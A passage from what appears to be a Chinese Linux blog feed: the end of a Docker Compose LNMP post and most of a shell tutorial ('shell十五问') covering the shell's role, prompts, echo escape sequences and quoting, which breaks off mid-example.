&lt;p&gt;在这个例子中，我使用的是 Docker Compose，这样比较简洁，如果使用 &lt;code&gt;docker&lt;/code&gt; 命令也可以做到同样的效果，当然，过程要相对繁琐一些。&lt;/p&gt;
&lt;h2 id=&quot;服务&quot;&gt;&lt;a href=&quot;#服务&quot; class=&quot;headerlink&quot; title=&quot;服务&quot;&gt;&lt;/a&gt;服务&lt;/h2&gt;&lt;p&gt;在 &lt;code&gt;docker-compose.yml&lt;/code&gt; 文件中，定义了3个&lt;strong&gt;服务&lt;/strong&gt;，分别是 &lt;code&gt;nginx&lt;/code&gt;, &lt;code&gt;php&lt;/code&gt; 和 &lt;code&gt;mysql&lt;/code&gt;。&lt;/p&gt;
&lt;figure class=&quot;highlight yml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;services:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;    nginx:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;        image:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;$&amp;#123;DOCKER_USER&amp;#125;/lnmp-nginx:v1.2&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;        build:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;            context:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;            dockerfile:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;Dockerfile.nginx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;...&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;    php:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;        image:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;$&amp;#123;DOCKER_USER&amp;#125;/lnmp-php:v1.2&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;        build:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;            context:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;            dockerfile:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;Dockerfile.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;...&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;    mysql:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;        image:&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;mysql:5.7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;...&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中 &lt;code&gt;mysql&lt;/code&gt; 服务中的 &lt;code&gt;image: mysql:5.7&lt;/code&gt; 是表明使用的是 &lt;code&gt;mysql:5.7&lt;/code&gt; 这个镜像。而 &lt;code&gt;nginx&lt;/code&gt; 和 &lt;code&gt;php&lt;/code&gt; 服务中的 &lt;code&gt;image&lt;/code&gt; 含义更为复杂。一方面是说，要使用其中名字的镜像，另一方面，如果这个镜像不存在，则利用其下方指定的 &lt;code&gt;build&lt;/code&gt; 指令进行构建。在单机环境，这里的 &lt;code&gt;image&lt;/code&gt; 并非必须，只保留 &lt;code&gt;build&lt;/code&gt; 就可以。但是在 Swarm 环境中，需要集群中全体主机使用同一个镜像，每个机器自己构建就不合适了，指定了 &lt;code&gt;image&lt;/code&gt; 后，就可以在单机 &lt;code&gt;build&lt;/code&gt; 并 &lt;code&gt;push&lt;/code&gt; 到 registry，然后在集群中执行 &lt;code&gt;up&lt;/code&gt; 的时候，才可以自动从 registry 下载所需镜像。&lt;br&gt;
    
    </summary>
    
      <category term="系统运维" scheme="https://linux7788.com/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"/>
    
      <category term="Docker" scheme="https://linux7788.com/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/Docker/"/>
    
    
      <category term="Docker" scheme="https://linux7788.com/tags/Docker/"/>
    
      <category term="lnmp" scheme="https://linux7788.com/tags/lnmp/"/>
    
  </entry>
  
  <entry>
    <title>shell十五问--shell教程</title>
    <link href="https://linux7788.com/linux_ops/13_questions_of_shell/"/>
    <id>https://linux7788.com/linux_ops/13_questions_of_shell/</id>
    <published>2018-04-14T02:38:25.000Z</published>
    <updated>2018-05-18T15:32:59.011Z</updated>
    
    <content type="html"><![CDATA[<h2 id="shell十五问之1-何为shell？"><a href="#shell十五问之1-何为shell？" class="headerlink" title="shell十五问之1: 何为shell？"></a>shell十五问之1: 何为shell？</h2><hr><p>在我们回答 <code>shell</code>是什么东西之前，不妨让我们重新审视<code>使用者</code>和<code>计算机系统</code>的关系：</p><p>我们知道计算机的运作不能离开硬件，但使用者却无法直接操作硬件，硬件的驱动只能通过一种称为“<code>操作系统</code>(<code>OS</code>，<code>Opertating System</code>)”的软件来管控。<br>事实上，我们每天所谈的“<code>linux</code>”，严格来说只是一个<code>操作系统</code>(<code>OS</code>),我们称之为“<code>内核</code>(<code>kernel</code>)”。</p><p>然而，从使用者的角度来说，使用者没有办法直接操作一个<code>kernel</code>，而是通过<code>kernel</code>的“外壳”程序，也就是所谓的<code>shell</code>，来与<code>kernel</code>沟通。<br>这也正是<code>kernel</code>跟<code>shell</code>的形象命名的的关系。如图：<br><img src="https://linux7788.com/images/posts/kernel_shell.jpg" alt="image"></p><p>从技术的角度来说，<code>shell</code>是一个使用者与系统的<code>交互界面(interface)</code>,只能让使用者通过<code>命令行</code>(<code>command line</code>)来使用系统来完成工作。<br>因此，<code>shell</code>最简单的定义就是<code>命令解释器</code>( <code>Command Interpreter</code>):</p><ul><li>将使用者的命令翻译给kernel来处理；</li><li>同时，将kernel的处理结果翻译给使用者。</li></ul><p>每次当我们完成<code>系统登入</code>(<code>login</code>), 我们就取得一个交互模式的shell，也称之为<code>login shell</code> 或者 <code>primary shell</code>。<br>若从<code>进程</code>(<code>process</code>)的角度来说，我们在shell所下达的命令，均是shell所产生的<code>子进程</code>。<br>这种现象，我暂可称之为<code>fork</code>。<br>如果是执行<code>shell脚本</code>(<code>shell script</code>)的话，脚本中命令则是由另一个非交互模式的<code>子shell</code>(<code>sub shell</code>)来执行的。<br>也就是<code>primary shell</code>产生<code>sub shell</code>的进程，而该<code>sub shell</code>进程再产生<code>script</code>中所有命令的进程。<br> (关于进程，我们日后有机会在补充)<br>这里， 我们必须知道：<code>kernel</code> 与 <code>shell</code> 是不同的两套软件，而且都是可以被替换的：</p><ul><li>不同的<code>OS</code>使用不同的<code>kernel</code>;</li><li>同一个kernel之上，也可以使用不同的<code>shell</code>;</li></ul><p>在<code>Linux</code>的预设系统中，通常可以找到好几种不同的<code>shell</code>,且通常会被记录在如下文件中：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/shells</span><br></pre></td></tr></table></figure></p><p>不同的<code>shell</code>有着不同的功能，且彼此各异，或者说“大同小异”。<br>常见的<code>shell</code>主要分为两大主流：</p><ol><li>sh：<ul><li>burne shell (sh)</li><li>burne again shell (bash)</li></ul></li><li>csh：<ul><li>c shell (csh)</li><li>tc shell (tcsh)</li><li>korn shell (ksh)<br>(FIXME)</li></ul></li></ol><p>大部分的<code>Linux</code>操作系统的预设<code>shell</code>都是<code>bash</code>，其原因大致如下两种：</p><ul><li>自由软件</li><li>功能强大</li></ul><p><code>bash</code>是<code>gnu project</code>最成功的产品之一，自推出以来深受广大<code>Unix</code>用户的喜爱，且也逐渐成为不少组织的系统标准。</p><a id="more"></a><h2 id="shell十五问之2：shell-prompt-PS1-与Carriage-Return-CR-关系"><a href="#shell十五问之2：shell-prompt-PS1-与Carriage-Return-CR-关系" class="headerlink" title="shell十五问之2：shell prompt(PS1)与Carriage Return(CR)关系"></a>shell十五问之2：shell prompt(PS1)与Carriage Return(CR)关系</h2><hr><p>当你成功登陆一个<code>shell</code>终端的文字界面之后，大部分的情形下，你会在屏幕上看到一个不断闪烁的方块或者底线(视不同的版本而别)，我们称之为<code>游标</code>(<code>cursor</code>)。<br><code>cursor</code>作用就是告诉你接下来你从键盘输入的按键所插入的位置，且每输入一个键，<code>cursor</code>便向右移动一个格子，如果连续输入太多的话，则自动接在下一行输入。</p><p>假如你刚完成登陆，还没有输入任何按键之前，你所看到的<code>cursor</code>所在的位置的同一行的左边部分，我们称之为<code>提示符</code>(<code>prompt</code>)。</p><p>提示符的格式或因不同的版本而各有不同，在<code>Linux</code>上，只需留意最接近<code>游标</code>的一个提示符号，通常是如下两者之一：</p><ul><li>$: 给一般用户账号使用;</li><li>#: 给root(管理员)账号使用;</li></ul><p>事实上，<code>shell prompt</code>的意思很简单：<br>告诉<code>shell</code>使用者，您现在可以输入命令行了。</p><p>我们可以说，使用者只有在得到shell prompt才能打命令行，而<code>cursor</code>是指示键盘在命令行的输入位置，使用者每输入一个键，<code>cursor</code>就往后移动一个格，直到碰到命令行读进<code>CR</code>(<code>Carriage Return</code>, 由<code>Enter</code>键产生)字符为止。<br> <code>CR</code>的意思也很简单：<br>使用者告诉<code>shell</code>：老兄，你可以执行的我命令行了。<br>严格来说：<br>所谓的命令行， 就是在<code>shell prompt</code>与<code>CR</code>之间所输入的文字。</p><p>(<strong>question：为何我们这里坚持使用<code>CR</code>字符而不说<code>Enter</code>按键呢？答案在后面的学习中给出</strong>)。</p><p>不同的命令可以接受的命令的格式各有不同，一般情况下，一个标准的命令行格式为如下所列：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command-name options argument</span><br></pre></td></tr></table></figure></p><p>若从技术的细节上来看，<code>shell</code>会依据<code>IFS</code>(<code>Internal Field Seperator</code>) 将 <code>command line</code>所输入的文字给拆解为<code>字段</code>(<code>word</code>)。<br>然后在针对特殊的<code>字符</code>(<code>meta</code>)先做处理，最后在重组整行<code>command line</code>。</p><p>(<strong>注意：请务必理解以上两句的意思，我们日后的学习中常回到这里思考</strong>。)</p><p>其中<code>IFS</code>是<code>shell</code>预设使用的字段位分隔符号，可以由一个及多个如下按键组成：</p><ul><li>空白键(White Space)</li><li>表格键(Tab)</li><li>回车键(Enter)</li></ul><p>系统可以接受的命令的名称(command-name)可以从如下途径获得：</p><ul><li>确的路径所指定的外部命令</li><li>命令的别名(alias)</li><li>shell内建命令(built-in)</li><li>$PATH之下的外部命令</li></ul><p>每一个命令行均必须包含命令的名称，这是不能缺少的。</p><h2 id="shell十五问之3：别人echo、你也echo，是问echo知多少？"><a href="#shell十五问之3：别人echo、你也echo，是问echo知多少？" class="headerlink" title="shell十五问之3：别人echo、你也echo，是问echo知多少？"></a>shell十五问之3：别人echo、你也echo，是问echo知多少？</h2><hr><p>承接上一章介绍的<code>command line</code>, 这里我们用<code>echo</code>这个命令加以进一步说明。</p><blockquote><p> <strong>温习</strong><br> 标准的<code>command line</code>三个组成部分：<code>command_name</code> <code>option</code> <code>argument</code></p></blockquote><p><code>echo</code>是一个非常简单、直接的<code>Linux</code>命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> argument</span></span><br></pre></td></tr></table></figure><p><code>echo</code>将<code>argument</code>送出到标准输出(stdout),通常是在监视器(monitor)上输出。</p><blockquote><p><strong>Note：</strong></p></blockquote><blockquote><p>在linux系统中任何一个进程默认打开三个文件：stdin、stdout、stderr.</p></blockquote><blockquote><p>stdin  标准输入</p></blockquote><blockquote><p>stdout 标准输出</p></blockquote><blockquote><p>stderr 标准错误输出</p></blockquote><p>为了更好理解，不如先让我们先跑一下<code>echo</code>命令好了：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"></span></span><br></pre></td></tr></table></figure></p><p>你会发现只有一个空白行，然后又回到了<code>shell prompt</code>上了。<br>这是因为<code>echo</code>在预设上，在显示完<code>argument</code>之后，还会送出以一个换行符号(<code>new-line charactor</code>)。<br>但是上面的command <code>echo</code>并没有任何<code>argument</code>，那结果就只剩一个换行符号。<br>若你要取消这个换行符号， 可以利用<code>echo</code>的<code>-n</code> 选项:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> -n</span></span><br><span class="line"><span class="meta">$</span><span class="bash"></span></span><br></pre></td></tr></table></figure></p><p>不妨让我们回到<code>command line</code>的概念上来讨论上例的echo命令好了：<br><code>command line</code>只有command_name(<code>echo</code>)及option(<code>-n</code>),并没有显示任何<code>argument</code>。</p><p>要想看看<code>echo</code>的<code>argument</code>，那还不简单接下来，你可以试试如下的输入：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> first line</span></span><br><span class="line">first line</span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> -n first line</span></span><br><span class="line">first line $</span><br></pre></td></tr></table></figure></p><p>以上两个<code>echo</code>命令中，你会发现<code>argument</code>的部分显示在你的屏幕，而换行符则视 <code>-n</code> 选项的有无而别。<br>很明显的，第二个<code>echo</code>由于换行符被取消了，接下来的<code>shell prompt</code>就接在输出结果的同一行了… ^_^。</p><p>事实上，<code>echo</code>除了<code>-n</code> 选项之外，常用选项有：</p><ul><li>-e: 启用反斜杠控制字符的转换(参考下表)</li><li>-E: 关闭反斜杠控制字符的转换(预设如此)</li><li>-n: 取消行末的换行符号(与-e选项下的\c字符同意)</li></ul><p>关于<code>echo</code>命令所支持的反斜杠控制字符如下表：</p><table><thead><tr><th>转义字符</th><th>字符的意义</th></tr></thead><tbody><tr><td>\a</td><td>ALERT / BELL(从系统的喇叭送出铃声)</td></tr><tr><td>\b</td><td>BACKSPACE, 也就是向左退格键</td></tr><tr><td>\c</td><td>取消行末之换行符号</td></tr><tr><td>\E</td><td>ESCAPE, 脱字符键</td></tr><tr><td>\f</td><td>FORMFEED, 换页字符</td></tr><tr><td>\n</td><td>NEWLINE,  换行字符</td></tr><tr><td>\r</td><td>RETURN,  回车键</td></tr><tr><td>\t</td><td>TAB, 表格跳位键</td></tr><tr><td>\v</td><td>VERTICAL TAB, 垂直表格跳位键</td></tr><tr><td>\n</td><td>ASCII 八进制编码(以x开头的为十六进制)，此处的n为数字</td></tr><tr><td>\</td><td>反斜杠本身</td></tr></tbody></table><blockquote><p><strong>Note：</strong><br>上述表格的资料来自O’Reilly出版社的<strong>Learning the Bash Shell, 2nd Ed</strong>.</p></blockquote><p>或许，我们可以通过实例来了解<code>echo</code>的选项及控制字符：</p><p>例一：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> -e <span class="string">"a\tb\tc\n\d\te\tf"</span></span></span><br><span class="line">a    bc</span><br><span class="line">def</span><br><span class="line"><span class="meta">$</span><span class="bash"></span></span><br></pre></td></tr></table></figure></p><p>上例中，用<code>\t</code>来分割<code>abc</code>还有<code>def</code>，及用<code>\n</code>将<code>def</code>换至下一行。</p><p>例二：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> -e <span class="string">"\141\011\142\011\143\012\144\011\145\011\146"</span></span></span><br><span class="line">abc</span><br><span class="line">def</span><br></pre></td></tr></table></figure></p><p>与例一中结果一样，只是使用<code>ASCII</code>八进制编码。</p><p>例三：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> -e <span class="string">"\x61\x09\x62\x09\x63\x0a\x64\x09\x65\x09\x66"</span></span></span><br><span class="line">abc</span><br><span class="line">def</span><br></pre></td></tr></table></figure></p><p>与例二差不多，只是这次换用<code>ASCII</code>的十六进制编码。</p><p>例四：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> -ne <span class="string">"a\tb\tc\nd\te\bf\a"</span></span></span><br><span class="line">a       b       c</span><br><span class="line">d       f $</span><br></pre></td></tr></table></figure></p><p>因为<code>e</code>字母后面是退格键<code>(\b)</code>，因此输出结果就没有<code>e</code>了。<br>在结束的时听到一声铃响，是<code>\a</code>的杰作。<br>由于同时使用了<code>-n</code>选项，因此<code>shell prompt</code>紧接在第二行之后。<br>若你不用<code>-n</code>的话，那你在<code>\a</code>后再加个<code>\c</code>，也是同样的效果。</p><p>事实上，在日后的<code>shell</code>操作及<code>shell script</code>设计上，<br><code>echo</code>命令是最常被使用的命令之一。<br>比方说，使用<code>echo</code>来检查变量值：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> A=B</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$A</span></span></span><br><span class="line">B</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> $?</span></span><br><span class="line">0</span><br></pre></td></tr></table></figure></p><blockquote><p> <strong>Note:</strong><br> 关于变量的概念，我们留到以下的两章跟大家说明。</p></blockquote><p>好了，更多的关于<code>command line</code>的格式， 以及<code>echo</code>命令的选项，请您自行多加练习、运用了。</p><h2 id="shell十五问之4：””-双引号-与’’-单引号-差在哪？"><a href="#shell十五问之4：””-双引号-与’’-单引号-差在哪？" class="headerlink" title="shell十五问之4：””(双引号)与’’(单引号)差在哪？"></a>shell十五问之4：””(双引号)与’’(单引号)差在哪？</h2><hr><p>还是回到我们的<code>command line</code>来吧。</p><p>经过前面两章的学习，应该很清楚当你在<code>shell prompt</code>后面敲打键盘,直到按下<code>Enter</code>键的时候，你输入的文字就是<code>command line</code>了，然后<code>shell</code>才会以进程的方式执行你所交给它的命令。<br>但是，你又可知道：你在<code>command line</code>中输入的每一个文字，对<code>shell</code>来说，是有类别之分的呢？</p><p>简单而言，(我不敢说精确的定义，<code>注1</code>),<code>command line</code>的每一个<code>charactor</code>, 分为如下两种：</p><ul><li>literal：也就是普通的纯文字，对<code>shell</code>来说没特殊功能；</li><li>meta: 对<code>shell</code>来说，具有特定功能的特殊保留元字符。</li></ul><blockquote><p><strong>Note:</strong></p></blockquote><blockquote><p>对于<code>bash shell</code>在处理<code>comamnd line</code>的顺序说明，请参考O’Reilly出版社的<strong>Learning the Bash Shell，2nd Edition</strong>，第177-180页的说明，尤其是178页的流程图：Figure 7-1。</p></blockquote><p><code>literal</code>没什么好谈的，像abcd、123456这些文字都是literal。(so easy? ^_^)<br>但meta却常使我们困惑。(confused?)<br>事实上，前两章，我们在<code>command line</code>中已碰到两个似乎每次都会碰到的meta：</p><ul><li><code>IFS</code>：有<code>space</code>或者<code>tab</code>或者<code>Enter</code>三者之一组成(我们常用space)</li><li><code>CR</code>： 由<code>Enter</code>产生；</li></ul><p><code>IFS</code>是用来拆解<code>command line</code>中每一个词(word)用的，因为<code>shell command line</code>是按词来处理的。<br>而<code>CR</code>则是用来结束<code>command line</code>用的，这也是为何我们敲<code>Enter</code>键，命令就会跑的原因。<br>除了常用的<code>IFS</code>与<code>CR</code>, 常用的meta还有：</p><table><thead><tr><th>meta字符</th><th>meta字符作用</th></tr></thead><tbody><tr><td>=</td><td>设定变量</td></tr><tr><td>$</td><td>作变量或运算替换(请不要与<code>shell prompt</code>混淆)</td></tr><tr><td>&gt;</td><td>输出重定向(重定向stdout)</td></tr><tr><td>&lt;</td><td>输入重定向(重定向stdin)</td></tr><tr><td>&amp;</td><td>重定向file descriptor或将命令至于后台(bg)运行</td></tr><tr><td>()</td><td>将其内部的命令置于nested subshell执行，或用于运算或变量替换</td></tr><tr><td>{}</td><td>将期内的命令置于non-named function中执行，或用在变量替换的界定范围</td></tr><tr><td>;</td><td>在前一个命令执行结束时，而忽略其返回值，继续执行下一个命令</td></tr><tr><td>&amp;&amp;</td><td>在前一个命令执行结束时，若返回值为true，继续执行下一个命令</td></tr><tr><td>!</td><td>执行histroy列表中的命令</td></tr><tr><td>…</td><td>…</td></tr></tbody></table><blockquote><p>补充：<code>|</code>是命令管道，而<code>||</code>的意思是在前一个命令执行结束时，若返回值为false，继续执行下一个命令。</p></blockquote><p>假如我们需要在<code>command line</code>中将这些保留元字符的功能关闭的话，就需要quoting处理了。</p><p>在<code>bash</code>中，常用的quoting有以下三种方法：</p><ul><li>hard quote：’’(单引号)，凡在hard quote中的所有meta均被关闭；</li><li>soft quote：””(双引号)，凡在soft quote中大部分meta都会被关闭，但某些会保留(如$);</li><li>escape: \ (反斜杠)，只有在紧接在escape(跳脱字符)之后的单一meta才被关闭；</li></ul><blockquote><p><strong>Note:</strong></p></blockquote><blockquote><p> 在soft quote中被豁免的具体meta清单，我不完全知道，有待大家补充，或通过实践来发现并理解。</p></blockquote><p>下面的例子将有助于我们对quoting的了解：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> A=B C <span class="comment">#空格键未被关掉，作为 IFS 处理。</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> C：<span class="built_in">command</span> not found.</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$A</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> A=<span class="string">"B C"</span> <span class="comment">#空格键已被关掉，仅作为空格键处理。</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$A</span></span></span><br><span class="line">B C</span><br></pre></td></tr></table></figure></p><p>在第一个给A变量赋值时，由于空白符没有被关闭，<code>command line</code> 将被解释为：</p><blockquote><p>A=B 然后碰到<code>&lt;IFS&gt;</code>，接着执行C命令</p></blockquote><p>在第二次给A变量赋值时，由于空白符被置于soft quote中，因此被关闭，不在作为<code>IFS</code>：</p><blockquote><p><code>A=B&lt;space&gt;C</code></p></blockquote><p>事实上，空白符无论在soft quote还是在hard quote中，均被关闭。Enter键字符亦然：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> A=`B</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> C</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="string">'</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"<span class="variable">$A</span>"</span></span></span><br><span class="line">B</span><br><span class="line">C</span><br></pre></td></tr></table></figure><p>在上例中，由于<code>enter</code>被置于hard quote当中，因此不再作为<code>CR</code>字符来处理。<br>这里的<code>enter</code>单纯只是一个<code>断行符号</code>(<code>new-line</code>)而已，由于<code>command line</code>并没得到<code>CR</code>字符，因此进入第二个<code>shell prompt</code>(<code>PS2</code>, 以&gt;符号表示)，<code>command line</code>并不会结束，直到第三行，我们输入的<code>enter</code>并不在hard quote里面，因此没有被关闭。<br>此时，<code>command line</code>碰到<code>CR</code>字符，于是结束，交给shell来处理。</p><p>上例的<code>Enter</code>要是被置于soft quote中的话，<code>CR</code>字符也会同样被关闭：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> A=<span class="string">"B</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> C</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="string">"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$A</span></span></span><br><span class="line">B C</span><br></pre></td></tr></table></figure><p>然而，由于 <code>echo $A</code>时的变量没有置于soft quote中，因此，当变量替换完成后，并作命令行重组时，<code>enter</code>被解释为<code>IFS</code>，而不是new-line字符。</p><p>同样的，用escape亦可关闭CR字符：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> A=B\</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> C\</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$A</span></span></span><br><span class="line">BC</span><br></pre></td></tr></table></figure></p><p>上例中的，第一个<code>enter</code>跟第二个<code>enter</code>均被escape字符关闭了，因此也不作为<code>CR</code>来处理，但第三个<code>enter</code>由于没有被escape，因此，作为<code>CR</code>结束<code>command line</code>。<br>但由于<code>enter</code>键本身在shell meta中特殊性，在 <code>\</code> escape字符后面仅仅取消其<code>CR</code>功能， 而不保留其IFS功能。</p><p>你或许发现光是一个<code>enter</code>键所产生的字符，就有可能是如下这些可能：</p><ul><li>CR</li><li>IFS</li><li>NL(New Line)</li><li>FF(Form Feed)</li><li>NULL</li><li>…</li></ul><p>至于，什么时候解释为什么字符，这个我就没法去挖掘了，或者留给读者君自行慢慢摸索了。</p><p>至于soft quote跟hard quote的不同，主要是对于某些meta的关闭与否，以<code>$</code>来做说明：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> A=B\ C</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"<span class="variable">$A</span>"</span></span></span><br><span class="line">B C</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'$A'</span></span></span><br><span class="line"><span class="meta">$</span><span 